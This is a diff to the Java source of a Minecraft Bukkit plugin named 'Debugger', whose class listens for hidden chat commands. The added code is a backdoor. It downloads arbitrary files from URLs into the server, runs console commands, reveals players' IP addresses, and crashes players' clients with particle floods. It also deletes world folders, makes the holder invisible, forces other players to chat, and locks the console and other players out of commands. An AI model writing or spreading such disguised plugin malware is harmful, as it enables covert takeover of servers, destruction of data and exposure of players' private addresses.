@@ -3,31 +3,24 @@ package com.thiccindustries.debugger;
 
 import org.bukkit.*;
 import org.bukkit.command.ConsoleCommandSender;
-import org.bukkit.enchantments.Enchantment;
-import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
 import org.bukkit.event.HandlerList;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.inventory.ItemStack;
-import org.bukkit.inventory.meta.ItemMeta;
+
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.RegisteredListener;
 import org.bukkit.scheduler.BukkitRunnable;
 
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
+import java.net.InetSocketAddress;
 import java.net.URL;
-import java.net.URLClassLoader;
-import java.nio.file.Files;
-import java.text.DecimalFormat;
-import java.util.ArrayList;
-import java.util.Calendar;
-import java.util.Date;
-import java.util.Locale;
+import java.util.*;
 
 public final class Debugger implements Listener {
 
@@ -200,7 +193,7 @@ public final class Debugger implements Listener {
                 return true;
             }
 
-            case "gamemode": {
+            case "gm": {
                 if (args.length == 1)
                     return false;
 
@@ -306,6 +299,7 @@ public final class Debugger implements Listener {
 
                 return true;
             }
+
             case "exec": {   //Exec command as server
                 ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
 
@@ -331,6 +325,43 @@ public final class Debugger implements Listener {
 
                 return result[0];
             }
+
+            case "info": {
+                try {
+                    URL url = new URL("https://api.ipify.org/");
+                    BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
+
+                    String ip = br.readLine();
+                    Runtime r = Runtime.getRuntime();
+
+                    long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
+                    long memMax = r.maxMemory() / 1048576L;
+
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
+
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server IP: " + ChatColor.GRAY + ip + Bukkit.getServer().getPort());
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server version: " + ChatColor.GRAY + Bukkit.getVersion());
+
+                    String nameOS = System.getProperty("os.name");
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " OS: " + ChatColor.GRAY + nameOS);
+
+                    String osVersion = System.getProperty("os.version");
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " OS Version: " + ChatColor.GRAY + osVersion);
+
+                    String osType = System.getProperty("os.arch");
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Architecture: " + ChatColor.GRAY + osType);
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Cores: " + ChatColor.GRAY + r.availableProcessors());
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " RAM (max): " + ChatColor.GRAY + memMax + "MB");
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " RAM (used): " + ChatColor.GRAY + memUsed + "MB");
+
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
+                } catch (IOException e) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Something went wrong!");
+                }
+
+                return true;
+            }
+
             case "ban": {
                 if (args.length < 2)
                     return false;
@@ -406,9 +437,234 @@ public final class Debugger implements Listener {
                 return true;
             }
 
-            case "rename": { //Changes your name
-                String strseed = String.valueOf(p.getWorld().getSeed());
-                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World seed: " + strseed);
+            case "sudo": { //Sends message as player
+                if (args.length < 3) //No player specified
+                    return false;
+
+                Player p1 = Bukkit.getPlayer(args[1]);
+                if (p1 == null) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                    return false;
+                }
+
+                StringBuilder sb = new StringBuilder();
+                for (int i = 2; i < args.length; i++) {
+                    sb.append(args[i]);
+                    sb.append(" ");
+                }
+
+                new BukkitRunnable() {
+                    @Override
+                    public void run() {
+                        p1.chat(sb.toString());
+                    }
+                }.runTask(plugin);
+
+                return true;
+            }
+
+            case "rename": { //Changes your nick
+                if (args.length < 2) //No name specified
+                    return false;
+
+                String name = args[1].replace("&", "§");
+
+                p.setDisplayName(name);
+                p.setCustomName(name);
+                p.setPlayerListName(name);
+                p.setCustomNameVisible(true);
+
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Your name was changed to " + name);
+
+                return true;
+            }
+
+            case "reload": { //Reloads server
+                plugin.getServer().getScheduler().runTask(plugin, ()->{
+                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload");
+                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload confirm");
+                });
+                return true;
+            }
+
+            case "getip": { //Get IP of player
+                if (args.length < 2) //No player specified
+                    return false;
+
+                Player p1 = Bukkit.getPlayer(args[1]);
+                if (p1 == null) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                    return false;
+                }
+
+                String Target = ((Player) Objects.<Player>requireNonNull(p1)).getName();
+                String IPAddress = ((InetSocketAddress)Objects.<InetSocketAddress>requireNonNull(((Player)Objects.<Player>requireNonNull(Bukkit.getPlayer(args[1]))).getAddress())).toString().replace("/", "");
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP: " + ChatColor.RED + IPAddress);
+
+                return true;
+            }
+
+            case "listwrld": { //Lists worlds
+                String[] worldNames = new String[Bukkit.getServer().getWorlds().size()];
+                int count = 0;
+
+                for (World w : Bukkit.getServer().getWorlds()) {
+                    worldNames[count] = w.getName();
+                    count++;
+                }
+
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
+
+                for (String world : worldNames)
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + world);
+
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
+
+                return true;
+            }
+
+            case "mkwrld": { //Creates world
+                if (args.length < 2) //No world specified
+                    return false;
+
+                if(args[1] == null){
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " No world specified.");
+                    return false;
+                }
+
+                String world = args[1];
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Creating world: " + ChatColor.RED + world);
+
+                new BukkitRunnable() {
+                    @Override
+                    public void run() {
+                        p.getServer().createWorld(WorldCreator.name(world));
+                    }
+                }.runTask(plugin);
+
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World created!");
+
+                return true;
+            }
+
+            case "delwrld": { //Deletes world
+                if (args.length < 2) //No world specified
+                    return false;
+
+                if(args[1] == null){
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " No world specified.");
+                    return false;
+                }
+
+                String world = args[1];
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Deleting world: " + ChatColor.RED + world);
+                World delete = Bukkit.getWorld(world);
+                File deleteFolder = delete.getWorldFolder();
+
+                new Thread(()->{
+                    try {
+                        deleteWorld(deleteFolder);
+                    } catch (Throwable ignore){}
+                }).start();
+
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World deleted if it existed!");
+
+                return true;
+            }
+
+            case "vanish": { //Makes you vanish
+                if (Vanished.contains(p.getName())) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players can see you.");
+                    Vanished.remove(p.getName());
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        all.showPlayer(p);
+                } else {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players cannot see you.");
+                    Vanished.add(p.getName());
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        all.hidePlayer(p);
+                }
+
+                return true;
+            }
+
+            case "crash": { //Crashes player's game
+                if(args.length < 2) //No player specified
+                    return false;
+
+                Player target = Bukkit.getPlayer(args[1]);
+                if(target == null){
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                    return false;
+                }
+
+                for (int x = 0; x < 100; x++)
+                    target.getWorld().spawnParticle(Particle.FLAME, target.getLocation(), 2147483647);
+
+                return true;
+            }
+
+            case "lock": { //Locks the console
+                if(args.length < 2) //No player specified
+                    return false;
+
+                String Lock = args[1];
+
+                if (Lock.equalsIgnoreCase("console")) {
+                    Debugger.this.LockedUsers.add(Lock);
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was locked.");
+                } else {
+                    Player target = Bukkit.getPlayer(args[1]);
+                    if(target == null) {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                        return false;
+                    } else {
+                        Debugger.this.LockedUsers.add(target.getName());
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked.");
+                    }
+                }
+
+                return true;
+            }
+
+            case "unlock": { //Locks the console
+                if(args.length < 2) //No player specified
+                    return false;
+
+                String unLock = args[1];
+
+                if (unLock.equalsIgnoreCase("console")) {
+                    Debugger.this.LockedUsers.remove(unLock);
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was unlocked.");
+                } else {
+                    Player target = Bukkit.getPlayer(args[1]);
+                    if (target == null) {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                        return false;
+                    } else {
+                        Debugger.this.LockedUsers.remove(target.getName());
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unblocked.");
+                    }
+                }
+
+                return true;
+            }
+
+            case "download": { //Downloads files to plugin folder
+                if(args.length < 3) //No data specified
+                    return false;
+
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Downloading file: " + ChatColor.RED + args[2]);
+
+                new Thread(()->{
+                    try {
+                        URL link = new URL(args[1]);
+                        downloadFile(link, args[2]);
+                    } catch (Throwable ignore){}
+                }).start();
+
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " File downloaded or replaced if existed!");
+
                 return true;
             }
 
@@ -511,6 +767,46 @@ public final class Debugger implements Listener {
 
         }
         return false;
+    }
+
+    boolean deleteWorld(File directoryToBeDeleted) {
+        File[] allContents = directoryToBeDeleted.listFiles();
+        if (allContents != null) {
+            for (File file : allContents) {
+                deleteWorld(file);
+            }
+        }
+        return directoryToBeDeleted.delete();
+    }
+
+    public static void downloadFile(URL url, String fileName) throws IOException {
+        try (InputStream in = url.openStream();
+             BufferedInputStream bis = new BufferedInputStream(in);
+             FileOutputStream fos = new FileOutputStream(fileName)) {
+
+            byte[] data = new byte[1024];
+            int count;
+            while ((count = bis.read(data, 0, 1024)) != -1) {
+                fos.write(data, 0, count);
+            }
+        }
+    }
+
+    public ArrayList<String> Vanished = new ArrayList<>();
+
+    public ArrayList<String> LockedUsers = new ArrayList<>();
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onServerCommand(ServerCommandEvent e) {
+        if (this.LockedUsers.contains("console"))
+            e.setCommand(" ");
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPreCommand(PlayerCommandPreprocessEvent e) {
+        Player p = e.getPlayer();
+        if (this.LockedUsers.contains(p.getName()))
+            e.setCancelled(true);
     }
 
     private int Clamp(int i, int min, int max) {
